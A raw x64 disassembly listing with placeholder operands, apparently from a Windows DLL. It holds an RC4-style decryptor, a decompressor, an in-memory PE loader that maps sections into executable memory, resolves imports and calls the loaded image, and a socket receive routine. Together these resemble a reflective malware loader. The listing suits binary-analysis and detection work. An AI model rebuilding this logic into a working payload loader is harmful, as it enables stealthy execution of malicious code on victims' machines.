mov [ rsp + 0x18 ] rdi
cmovg r10d r8d
xor eax eax
xor eax eax
pop rsi
retn
mov [ rcx ] al
inc eax
inc rcx
cmp eax r8d
jl r-xdata
xor bl bl
mov [ r9 + 0x100 ] 0x0
mov [ r9 + 0x101 ] 0x0
xor dil dil
mov r11 r9
nop [ rax + rax ] ax
movzx edx [ r11 ]
movzx eax dil
inc dil
movzx ecx [ rax + rsi ]
mov [ rw-data ] dl
inc r11
add cl dl
add bl cl
movzx ecx bl
movzx eax [ rcx + r9 ]
mov [ r11 - 0x1 ] al
movzx eax dil
mov [ rcx + r9 ] dl
cdq
idiv r10d
sub r8 0x1
mov edi edx
jne r-xdata
mov rdi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
lea eax [ r8 + 0x1 ]
pop rsi
retn
sub_180002640
push rsi
cmp edx 0x1
mov r9 r8
mov rsi rcx
jge r-xdata
movzx r10d [ r8 + 0x100 ]
movzx r11d [ r8 + 0x101 ]
mov [ rsp + 0x10 ] rbx
xor ebx ebx
mov [ rsp + 0x18 ] rdi
movsxd rdi edx
test edx edx
jle r-xdata
xor eax eax
pop rsi
retn
mov rdi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov [ r9 + 0x100 ] r10b
mov [ r9 + 0x101 ] r11b
mov eax 0x1
pop rsi
retn
nop [ rax + rax ] ax
inc r10b
inc rbx
movzx r8d r10b
movzx edx [ r8 + r9 ]
add r11b dl
mov [ rw-data ] dl
movzx ecx r11b
movzx eax [ rcx + r9 ]
mov [ r8 + r9 ] al
mov [ rcx + r9 ] dl
movzx ecx [ r8 + r9 ]
add ecx edx
movzx eax cl
movzx ecx [ rax + r9 ]
xor [ rbx + rsi - 0x1 ] cl
cmp rbx rdi
jl r-xdata
sub_1800026e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
push r12
push r13
mov eax 0x12a0
call sub_180015990
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1290 ] rax
mov rdi r8
xor esi esi
mov r12d esi
mov rbx rsi
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x30 ] rsi
lea rdx [ r--data ]
mov rcx r8
call sub_180004cf8
mov r13 rax
mov [ rsp + 0x30 ] rax
test rax rax
jne r-xdata
mov [ rsp + 0x40 ] esi
xor edx edx
lea r8d [ rdx + 0x2c ]
lea rcx [ rsp + 0x44 ]
call sub_180009540
lea rdx [ rsp + 0x40 ]
mov rcx rdi
call sub_180004dc0
movsxd rdx [ rsp + 0x54 ]
test edx edx
jne r-xdata
lea r12d [ rsi + 0x1 ]
jmp r-xdata
mov rcx rdx
call sub_180004454
mov rbx rax
mov [ rsp + 0x28 ] rax
test rax rax
jne r-xdata
lea r12d [ rdx + 0x1 ]
jmp r-xdata
test rbx rbx
je r-xdata
movsxd r8 [ rsp + 0x54 ]
mov r9 r13
mov edx 0x1
mov rcx rax
call sub_180004b9c
test rax rax
jne r-xdata
lea r12d [ rax + 0x1 ]
jmp r-xdata
test r13 r13
je r-xdata
mov rcx rbx
call sub_180004690
mov [ rsp + 0x20 ] esi
movsxd rdi [ rsp + 0x54 ]
mov rax [ rdi + rbx - 0x8 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x290 ] 0x0
xor edx edx
mov r8d 0xfff
lea rcx [ rsp + 0x291 ]
call sub_180009540
mov eax [ rsp + 0x20 ]
lea r8 [ rax + 0x8 ]
sub rdi rax
lea rdx [ rdi + rbx - 0x10 ]
lea rcx [ rsp + 0x290 ]
call sub_1800059c0
mov [ rsp + 0x38 ] esi
mov rax [ rsp + 0x290 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x180 ] 0x0
xor edx edx
mov r8d 0x103
lea rcx [ rsp + 0x181 ]
call sub_180009540
mov r9d [ rsp + 0x290 ]
xor r9d 0x19860609
lea r8 [ r--data ]
mov edx 0x104
lea rcx [ rsp + 0x180 ]
call sub_1800045e0
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x180 ]
[ rdi ]
not rcx
dec rcx
cmp rcx 0x1
jb r-xdata
lea r12d [ rax + 0x1 ]
jmp r-xdata
test r12d r12d
sete sil
mov eax esi
mov rcx [ rsp + 0x1290 ]
xor rcx rsp
call sub_1800042d0
lea r11 [ rsp + 0x12a0 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
mov rcx r13
call sub_1800052b0
lea r8 [ rsp + 0x70 ]
mov edx [ rsp + 0x20 ]
lea rcx [ rsp + 0x298 ]
call sub_180002640
mov r8d [ rsp + 0x20 ]
lea rdx [ rsp + 0x298 ]
lea rcx [ rw-data ]
call sub_1800031d0
nop
lea r8 [ rsp + 0x70 ]
mov edx ecx
lea rcx [ rsp + 0x180 ]
call sub_180002590
sub_180002910
mov r8d ecx
cmp ecx 0xffff
jbe r-xdata
test ecx 0xff00
je r-xdata
mov al 0x10
nop [ rax ] eax
test cl 0xf0
je r-xdata
test ecx 0xf000
je r-xdata
inc al
or edx 0xffffffff
mov ecx 0x20
sub cl al
shr edx cl
cmp r8d edx
ja r-xdata
retn
test cl 0xc
je r-xdata
test cl 0xc0
je r-xdata
test ecx 0xc00
je r-xdata
test ecx 0xc000
je r-xdata
test cl 0x2
setne al
inc al
retn
test cl 0x8
setne al
add al 0x3
retn
test cl 0x20
setne al
add al 0x5
retn
test cl 0x80
setne al
add al 0x7
retn
bt ecx 0x9
setb al
add al 0x9
retn
bt ecx 0xb
setb al
add al 0xb
retn
bt ecx 0xd
setb al
add al 0xd
retn
bt ecx 0xf
setb al
add al 0xf
retn
sub_1800029b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
mov r12d [ rcx + 0x8 ]
movzx r9d [ rcx + 0xc ]
xor r10d r10d
mov rax r12
mov esi 0x8
mov r11d edx
add rax [ rcx ]
mov rbx rcx
mov edi r10d
sub esi r9d
mov ebp r10d
nop [ rax ] eax
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r9b
movzx eax [ r8 ]
shr edx cl
mov ecx esi
shl eax cl
inc r10d
mov ecx ebp
or edx eax
lea ebp [ r10 * 8 ]
mov rax r8
shl edx cl
or edi edx
cmp ebp r11d
jb r-xdata
mov rbp [ rsp + 0x18 ]
mov rsi [ rsp + 0x20 ]
add r9b r11b
movzx ecx r9b
mov eax ecx
and cl 0x7
shr eax 0x3
mov [ rbx + 0xc ] cl
mov ecx r11d
add eax r12d
mov [ rbx + 0x8 ] eax
mov rbx [ rsp + 0x10 ]
or eax 0xffffffff
shl eax cl
not eax
and eax edi
mov rdi [ rsp + 0x28 ]
pop r12
retn
sub_180002a60
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8d
mov [ rax + 0x10 ] rdx
push rsi
push r13
push r14
push r15
sub rsp 0x68
xor r15d r15d
mov r13b 0x1
xor r10b r10b
mov r14 rcx
mov [ rsp + 0x20 ] rcx
mov [ rax - 0x60 ] rcx
mov r11d r15d
mov [ rax - 0x53 ] r13b
mov rsi rdx
test r8d r8d
je r-xdata
mov rax [ rsp + 0xa8 ]
test r10b r10b
setne r15b
add r15d r11d
sub rsi rdx
mov [ rax ] r15d
mov eax esi
add rsp 0x68
pop r15
pop r14
pop r13
pop rsi
retn
mov [ rax - 0x28 ] rbx
mov [ rax - 0x30 ] rbp
mov [ rax - 0x38 ] rdi
mov [ rax - 0x40 ] r12
nop [ rax + rax ] ax
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r12b
movzx eax [ r8 ]
shr edx cl
mov ecx edi
shl eax cl
inc r9d
mov ecx ebp
or edx eax
lea ebp [ r9 * 8 ]
mov rax r8
shl edx cl
or ebx edx
cmp ebp 0x1
jb r-xdata
inc r10b
movzx eax r10b
and r10b 0x7
shr eax 0x3
add r11d eax
test bl 0x1
jne r-xdata
mov eax r11d
movzx r12d r10b
mov edi 0x8
add rax r14
mov r9d r15d
mov ebx r15d
sub edi r12d
mov ebp r15d
nop [ rax + rax ] eax
mov eax r11d
movzx r12d r10b
mov edi 0x8
add rax r14
mov r9d r15d
mov ebx r15d
sub edi r12d
mov ebp r15d
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r12b
movzx eax [ r8 ]
shr edx cl
mov ecx edi
shl eax cl
inc r9d
mov ecx ebp
or edx eax
lea ebp [ r9 * 8 ]
mov rax r8
shl edx cl
or ebx edx
cmp ebp 0x1
jb r-xdata
inc r10b
movzx eax r10b
and r10b 0x7
shr eax 0x3
add r11d eax
test bl 0x1
jne r-xdata
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r12b
movzx eax [ r8 ]
shr edx cl
mov ecx edi
shl eax cl
inc r9d
mov ecx ebp
or edx eax
lea ebp [ r9 * 8 ]
mov rax r8
shl edx cl
or ebx edx
cmp ebp 0x8
jb r-xdata
add r10b 0x8
mov [ rsi ] bl
movzx eax r10b
and r10b 0x7
shr eax 0x3
add r11d eax
inc rsi
jmp r-xdata
mov eax r11d
movzx r12d r10b
mov edi 0x8
add rax r14
mov r9d r15d
mov ebx r15d
sub edi r12d
mov ebp r15d
nop [ rax ] eax
mov rdx [ rsp + 0x98 ]
movzx ecx r13b
mov eax 0x1
shl eax cl
movsxd rcx eax
mov rax rsi
sub rax rdx
cmp rcx rax
jge r-xdata
cmp r11d [ rsp + 0xa0 ]
jb r-xdata
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r12b
movzx eax [ r8 ]
shr edx cl
mov ecx edi
shl eax cl
inc r9d
mov ecx ebp
or edx eax
lea ebp [ r9 * 8 ]
mov rax r8
shl edx cl
or ebx edx
cmp ebp 0x1
jb r-xdata
inc r10b
movzx eax r10b
and r10b 0x7
shr eax 0x3
add r11d eax
test bl 0x1
jne r-xdata
movzx ebp r13b
mov edx r11d
mov edi 0x8
movzx r13d r10b
add rdx r14
mov r9d r15d
mov ebx r15d
mov r12d r15d
sub edi r13d
nop [ rax ] eax
mov ecx esi
sub ecx edx
dec ecx
call sub_180002910
movzx r13d al
mov [ rsp + 0x35 ] al
mov eax r11d
movzx r12d r10b
mov edi 0x8
add rax r14
mov r9d r15d
mov ebx r15d
sub edi r12d
mov ebp r15d
nop [ rax + rax ] eax
mov rdx [ rsp + 0x98 ]
mov r12 [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rbx [ rsp + 0x60 ]
mov eax r11d
movzx r12d r10b
mov edi 0x8
add rax r14
mov ebx r15d
mov r9d r15d
sub edi r12d
mov ebp r15d
nop [ rax + rax ] ax
mov eax r11d
movzx r12d r10b
mov edi 0x8
add rax r14
mov r9d r15d
mov ebx r15d
sub edi r12d
mov ebp r15d
nop [ rax + rax ] ax
movzx eax [ rdx + 0x1 ]
lea r8 [ rdx + 0x1 ]
movzx edx [ rdx ]
movzx ecx r13b
inc r9d
shr edx cl
mov ecx edi
shl eax cl
mov ecx r12d
lea r12d [ r9 * 8 ]
or edx eax
shl edx cl
or ebx edx
mov rdx r8
cmp r12d ebp
jb r-xdata
add r10b bpl
mov ecx ebp
movzx eax r10b
and r10b 0x7
shr eax 0x3
add r11d eax
or eax 0xffffffff
shl eax cl
not eax
and eax ebx
inc eax
xor r13b r13b
mov [ rsp + 0x90 ] eax
nop [ rax ] eax
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r12b
movzx eax [ r8 ]
shr edx cl
mov ecx edi
shl eax cl
inc ebx
mov ecx ebp
or edx eax
lea ebp [ rbx * 8 ]
mov rax r8
shl edx cl
or r9d edx
cmp ebp 0x4
jb r-xdata
add r10b 0x4
and r9d 0xf
movzx eax r10b
and r10b 0x7
shr eax 0x3
mov [ rsp + 0x34 ] r10b
add r11d eax
mov eax r9d
sub eax 0xe
mov [ rsp + 0x30 ] r11d
je r-xdata
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r12b
movzx eax [ r8 ]
shr edx cl
mov ecx edi
shl eax cl
inc r9d
mov ecx ebp
or edx eax
lea ebp [ r9 * 8 ]
mov rax r8
shl edx cl
or ebx edx
cmp ebp 0x7
jb r-xdata
add r10b 0x7
and ebx 0x7f
mov r12d 0x8
movzx eax r10b
and r10b 0x7
inc ebx
shr eax 0x3
movzx r13d r10b
mov edi r15d
add r11d eax
mov r9d r15d
mov ebp r15d
mov eax r11d
add rax r14
sub r12d r13d
nop [ rax + rax ] ax
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx bpl
movzx eax [ r8 ]
shr edx cl
mov ecx edi
shl eax cl
inc ebx
mov ecx r12d
or edx eax
lea r12d [ rbx * 8 ]
mov rax r8
shl edx cl
or r9d edx
cmp r12d 0x1
jb r-xdata
inc r10b
movzx eax r10b
and r10b 0x7
shr eax 0x3
add r11d eax
test r9b 0x1
je r-xdata
lea rcx [ rsp + 0x28 ]
mov edx 0x7
call sub_1800029b0
mov r14 [ rsp + 0x28 ]
mov r10b [ rsp + 0x34 ]
mov r11d [ rsp + 0x30 ]
lea r9d [ rax + 0x16 ]
mov [ rsp + 0x20 ] r14
cmp eax 0x1
je r-xdata
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r13b
movzx eax [ r8 ]
shr edx cl
mov ecx r12d
shl eax cl
inc edi
mov ecx ebp
or edx eax
lea ebp [ rdi * 8 ]
mov rax r8
shl edx cl
or r9d edx
cmp ebp 0x1
jb r-xdata
inc r10b
and r9d 0x1
movzx eax r10b
and r10b 0x7
add r9d 0x2
shr eax 0x3
add r11d eax
movsxd rax ebx
cmp ebx 0x80
je r-xdata
movzx r14d r13b
mov eax r11d
movzx ebp r10b
add rax [ rsp + 0x20 ]
mov ebx 0x8
mov r9d r15d
lea r12d [ r14 + 0x3 ]
mov edi r15d
mov r13d r15d
sub ebx ebp
nop [ rax + rax ] ax
inc r13b
jmp r-xdata
movzx eax [ r8 + rcx ]
inc edx
inc rcx
mov [ rcx - 0x1 ] al
cmp edx r9d
jb r-xdata
movzx edi r10b
mov ebx 0x8
mov ebp r15d
mov r12d r15d
mov r13d r15d
sub ebx edi
nop [ rax + rax ] ax
lea rcx [ rsp + 0x28 ]
mov edx 0x10
call sub_1800029b0
mov r14 [ rsp + 0x28 ]
movzx r10d [ rsp + 0x34 ]
mov r11d [ rsp + 0x30 ]
lea r9d [ rax + 0x96 ]
mov [ rsp + 0x20 ] r14
jmp r-xdata
add r9d 0x8
jmp r-xdata
mov rcx rsi
sub rcx rax
nop
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx bpl
movzx eax [ r8 ]
shr edx cl
mov ecx ebx
shl eax cl
inc r9d
mov ecx r13d
or edx eax
lea r13d [ r9 * 8 ]
mov rax r8
shl edx cl
or edi edx
cmp r13d r12d
jb r-xdata
or edx 0xffffffff
add r10b r12b
mov ecx r12d
shl edx cl
movzx eax r10b
mov ecx r14d
shr eax 0x3
not edx
and r10b 0x7
add r11d eax
or eax 0xffffffff
and edx edi
shl eax cl
mov rcx rsi
not eax
lea r8d [ rdx + rax * 8 + 0x3 ]
movsxd rax [ rsp + 0x90 ]
sub rcx rax
nop [ rax + rax ] eax
mov eax r11d
movzx ebp r10b
mov edi 0x8
add rax r14
mov ebx r15d
mov r9d r15d
sub edi ebp
mov r12d r15d
nop [ rax + rax ] ax
movzx edx [ r14 ]
movzx eax [ r14 + 0x1 ]
movzx ecx dil
shr edx cl
mov ecx ebx
inc ebp
shl eax cl
mov ecx r13d
lea r13d [ rbp * 8 ]
or edx eax
inc r14
shl edx cl
or r12d edx
cmp r13d ebx
jb r-xdata
add r10b bl
mov ecx ebx
mov ebp r15d
movzx eax r10b
and r10b 0x7
mov ebx r15d
shr eax 0x3
movzx r13d r10b
mov r14d r15d
add r11d eax
mov eax 0xff
shl al cl
lea r11d [ r11 + r9 - 0x1 ]
not al
and al r12b
mov r12d 0x8
mov [ rsp + 0x90 ] eax
mov eax r11d
add rax [ rsp + 0x20 ]
sub r12d r13d
nop [ rax + rax ] eax
mov eax r11d
mov edx 0x1
lea rcx [ rsi + 0x1 ]
add r14 rax
mov r8 r14
sub r8 rsi
nop [ rax + rax ] eax
movzx eax [ rcx ]
inc rsi
inc rcx
add r9d 0xffffffff
mov [ rsi - 0x1 ] al
jne r-xdata
mov r13b [ rsp + 0x35 ]
jmp r-xdata
movzx eax [ rcx ]
inc rsi
inc rcx
add r8d 0xffffffff
mov [ rsi - 0x1 ] al
jne r-xdata
mov r14 [ rsp + 0x20 ]
mov r13b [ rsp + 0x35 ]
jmp r-xdata
movzx edx [ rax ]
lea r8 [ rax + 0x1 ]
movzx ecx r13b
movzx eax [ r8 ]
shr edx cl
mov ecx r12d
shl eax cl
inc ebx
mov ecx r14d
or edx eax
lea r14d [ rbx * 8 ]
mov rax r8
shl edx cl
or ebp edx
cmp r14d edi
jb r-xdata
mov r14 [ rsp + 0x20 ]
mov r13b [ rsp + 0x35 ]
add r10b dil
movzx eax r10b
mov ecx edi
mov edx 0xff
shl dl cl
shr eax 0x3
mov ecx 0x8
not dl
sub ecx edi
add r11d eax
and dl bpl
mov eax r9d
and r10b 0x7
shl dl cl
or dl [ rsp + 0x90 ]
mov [ rsi ] dl
add rsi rax
sub_1800031d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov edi r8d
mov rsi rdx
mov rbp rcx
xor ebx ebx
nop
lea r9 [ rsp + 0x40 ]
mov r8d edi
mov rdx rbp
mov rcx rsi
call sub_180002a60
mov r9d [ rsp + 0x40 ]
mov ecx eax
add rsi r9
add ebx eax
add rbp rcx
sub edi r9d
jne r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x48 ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180003230
push rbx
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rax [ rcx + 0x28 ]
test rax rax
je r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx [ rcx ]
xor r8d r8d
xor edx edx
call rax
xor eax eax
mov [ rbx + 0x20 ] eax
mov [ rbx + 0x28 ] rax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rax
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
sub_180003290
push rbx
push rbp
push r12
sub rsp 0x20
mov r12 r9
mov rbp rdx
mov rbx rcx
test r8d r8d
jne r-xdata
cmp [ rcx + 0x20 ] 0x0
je r-xdata
xor eax eax
add rsp 0x20
pop r12
pop rbp
pop rbx
retn
call sub_1800033d0
test eax eax
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x10 ]
mov eax [ rcx + 0x50 ]
test eax eax
je r-xdata
mov rcx [ rcx + 0x30 ]
mov [ rsp + 0x40 ] rsi
mov r9d 0x40
mov r8d 0x3000
mov rdx rax
mov [ rsp + 0x48 ] rdi
mov rsi rax
call [ VirtualAlloc@IAT ]
mov rdi rax
test rax rax
jne r-xdata
mov r8 rbp
mov rdx rdi
mov rcx rbx
call sub_180003470
mov rdx rdi
mov rcx rbx
call sub_180003680
mov rdx rdi
mov rcx rbx
call sub_180003530
mov r11 [ rbx + 0x10 ]
xor ebp ebp
mov [ r11 + 0x30 ] rdi
lea r8d [ rbp + 0x40 ]
lea r9 [ rsp + 0x50 ]
mov rdx rsi
mov rcx rdi
mov [ rsp + 0x50 ] ebp
call [ VirtualProtect@IAT ]
mov r11 [ rbx + 0x10 ]
lea edx [ rbp + 0x1 ]
mov r9d [ r11 + 0x28 ]
mov r8 r12
mov rcx rdi
add r9 rdi
mov [ rbx + 0x28 ] r9
call r9
test eax eax
jne r-xdata
lea r9d [ rax + 0x40 ]
mov r8d 0x103000
mov rdx rsi
xor ecx ecx
call [ VirtualAlloc@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov [ rbx ] rdi
mov [ rbx + 0x20 ] 0x1
mov eax 0x1
mov r8 r12
xor edx edx
mov rcx rdi
call [ rbx + 0x28 ]
xor edx edx
mov r8d 0x8000
mov rcx rdi
mov [ rbx + 0x28 ] rbp
call [ VirtualFree@IAT ]
xor eax eax
jmp r-xdata
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
pop rbp
pop rbx
retn
sub_1800033d0
mov r10d r8d
mov r9 rcx
cmp r8d 0x40
jae r-xdata
mov eax 0x5a4d
mov [ rcx + 0x8 ] rdx
cmp [ rdx ] ax
jne r-xdata
xor eax eax
retn
movsxd r8 [ rdx + 0x3c ]
mov rax r10
lea rcx [ r8 + 0x108 ]
cmp r10 rcx
jb r-xdata
lea rcx [ r8 + rdx ]
mov [ r9 + 0x10 ] rcx
cmp [ rcx ] 0x4550
jne r-xdata
movzx eax [ rcx + 0x16 ]
mov edx 0x2000
test dx ax
je r-xdata
test al 0x2
je r-xdata
movzx eax [ rcx + 0x14 ]
xor edx edx
lea r8 [ rax + rcx + 0x18 ]
mov [ r9 + 0x18 ] r8
cmp dx [ rcx + 0x6 ]
jae r-xdata
mov eax 0x1
retn
nop [ rax + rax ] ax
mov rax [ r9 + 0x10 ]
inc dx
cmp dx [ rax + 0x6 ]
jb r-xdata
movzx eax dx
lea rcx [ rax + rax * 4 ]
mov eax [ r8 + rcx * 8 + 0x14 ]
add eax [ r8 + rcx * 8 + 0x10 ]
cmp eax r10d
ja r-xdata
sub_180003470
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov r10 [ rcx + 0x10 ]
mov rbp r8
mov rsi rdx
movzx eax [ r10 + 0x6 ]
mov rdi rcx
mov rdx rbp
lea r9d [ rax + rax * 4 ]
mov eax [ r10 + 0x54 ]
mov rcx rsi
lea r8d [ rax + r9 * 8 ]
call sub_1800059c0
mov rax [ rdi + 0x10 ]
xor ebx ebx
cmp bx [ rax + 0x6 ]
jae r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov [ rdi + 0x8 ] rsi
movsxd rcx [ rsi + 0x3c ]
add rcx rsi
mov rsi [ rsp + 0x40 ]
mov [ rdi + 0x10 ] rcx
movzx eax [ rcx + 0x14 ]
lea rcx [ rax + rcx + 0x18 ]
mov [ rdi + 0x18 ] rcx
add rsp 0x20
pop rdi
retn
nop [ rax ] eax
mov rax [ rdi + 0x10 ]
inc bx
cmp bx [ rax + 0x6 ]
jb r-xdata
mov r8 rdx
mov edx [ rax + rcx * 8 + 0x14 ]
mov ecx [ rax + rcx * 8 + 0xc ]
add rcx rsi
add rdx rbp
call sub_1800059c0
movzx eax bx
lea rcx [ rax + rax * 4 ]
mov rax [ rdi + 0x18 ]
mov edx [ rax + rcx * 8 + 0x10 ]
test edx edx
je r-xdata
sub_180003530
push rbp
sub rsp 0x30
mov rax [ rcx + 0x10 ]
mov rbp rdx
cmp [ rax + 0x94 ] 0x0
jbe r-xdata
mov eax 0x1
add rsp 0x30
pop rbp
retn
mov [ rsp + 0x48 ] rsi
mov esi [ rax + 0x90 ]
add rsi rdx
mov edx 0x14
mov rcx rsi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rbp
retn
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] r13
mov r13 0x8000000000000000
nop [ rax ] eax
mov eax 0x1
lea rcx [ rbp + rax ]
call [ LoadLibraryA@IAT ]
mov r12 rax
cmp rax 0xffffffffffffffff
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ rsi ]
test ecx ecx
je r-xdata
mov r12 [ rsp + 0x28 ]
mov rdi [ rsp + 0x50 ]
mov rbx [ rsp + 0x40 ]
mov r13 [ rsp + 0x20 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rbp
retn
mov edi [ rsi + 0x10 ]
add rdi rbp
mov rbx rdi
mov ebx [ rsi + 0x10 ]
lea rdi [ rbp + rcx ]
add rbx rbp
jmp r-xdata
add rsi 0x14
mov edx 0x14
mov rcx rsi
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
test r13 rax
je r-xdata
mov rax [ rdi ]
test rax rax
je r-xdata
mov eax [ rsi + 0xc ]
test eax eax
je r-xdata
lea rdx [ rax + rbp + 0x2 ]
mov rcx r12
call [ GetProcAddress@IAT ]
mov [ rbx ] rax
movzx edx ax
mov rcx r12
call [ GetProcAddress@IAT ]
mov [ rbx ] rax
jmp r-xdata
mov rax [ rdi + 0x8 ]
add rdi 0x8
add rbx 0x8
test rax rax
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
sub_180003680
sub rsp 0x8
mov rax [ rcx + 0x10 ]
mov r11 rdx
cmp [ rax + 0xb0 ] 0x0
je r-xdata
xor eax eax
add rsp 0x8
retn
cmp [ rax + 0xb4 ] 0x0
je r-xdata
mov r10d [ rax + 0xb0 ]
mov [ rsp + 0x10 ] rbx
mov rbx rdx
sub rbx [ rax + 0x30 ]
add r10 rdx
mov r8d [ r10 + 0x4 ]
mov eax [ r10 ]
lea ecx [ r8 + rax ]
test ecx ecx
je r-xdata
mov eax 0x1
mov rbx [ rsp + 0x10 ]
add rsp 0x8
retn
mov [ rsp + 0x18 ] rsi
mov [ rsp ] rdi
mov edi 0xf000
mov esi 0xa000
nop [ rax + rax ] ax
mov eax [ r10 + 0x4 ]
add r10 rax
mov r8d [ r10 + 0x4 ]
mov eax [ r10 ]
lea ecx [ r8 + rax ]
test ecx ecx
jne r-xdata
mov r8d eax
nop [ rax + rax ] ax
mov eax r8d
lea rdx [ r10 + 0x8 ]
sub rax 0x8
shr rax 0x1
test eax eax
je r-xdata
mov rdi [ rsp ]
mov rsi [ rsp + 0x18 ]
add rdx 0x2
sub r8 0x1
jne r-xdata
mov ecx [ r10 ]
and r9d 0xfff
lea rax [ r11 + r9 ]
add [ rcx + rax ] rbx
mov r9w [ rdx ]
movzx eax r9w
and ax di
cmp ax si
jne r-xdata
sub_180003780
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov edi r8d
mov rbp rdx
mov r12 rcx
mov ebx esi
test r8d r8d
jle r-xdata
cmp edi ebx
sete sil
mov eax esi
nop [ rax ] eax
xor eax eax
jmp r-xdata
add ebx eax
cmp ebx edi
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov r8d edi
movsxd rdx ebx
xor r9d r9d
sub r8d ebx
add rdx rbp
mov rcx r12
call [ recv@IAT ]
test eax eax
jle r-xdata
sub_180003800
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor ebx ebx
mov [ rsp + 0x20 ] rbx
lea r8 [ r--data ]
xor edx edx
mov ecx 0x1f0003
call [ OpenEventW@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
test rax rax
jne r-xdata
or edx 0xffffffff
mov rcx rax
call [ WaitForSingleObject@IAT ]
mov ecx ebx
mov esi 0x1
cmp eax 0xffffffff
cmove ecx esi
mov esi ecx
lea esi [ rbx + 0x1 ]
jmp r-xdata
test esi esi
sete bl
mov eax ebx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rcx rdi
call [ CloseHandle@IAT ]
test rdi rdi
je r-xdata
sub_180003880
mov r11 rsp
mov [ r11 + 0x10 ] rbx
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
xor eax eax
cmp [ rcx + 0x24c ] 0x1
mov [ rsp + 0x40 ] 0x0
mov [ r11 - 0x67 ] rax
mov [ r11 - 0x5f ] rax
mov [ r11 - 0x57 ] rax
mov [ r11 - 0x4f ] rax
mov [ r11 - 0x47 ] rax
mov [ r11 - 0x3f ] rax
mov [ r11 - 0x37 ] rax
mov [ rsp + 0x79 ] eax
mov [ rsp + 0x7d ] ax
mov [ rsp + 0x7f ] al
mov [ r11 - 0x28 ] rax
mov [ r11 - 0x20 ] rax
mov [ r11 - 0x28 ] r8
mov [ r11 - 0x20 ] r9
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
lea rdx [ rcx + 0x4c ]
cmp edx 0x2
jne r-xdata
lea rdx [ rcx + 0x14c ]
cmp edx 0x3
jne r-xdata
lea rdx [ rcx + 0x8c ]
jmp r-xdata
xor eax eax
lea rcx [ rsp + 0x40 ]
mov r8d 0x3f
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x78 ] rax
call sub_180006080
xor ebx ebx
cmp [ rsp + 0x40 ] bl
je r-xdata
cmp edx 0x3
jne r-xdata
lea rdx [ rcx + 0x18c ]
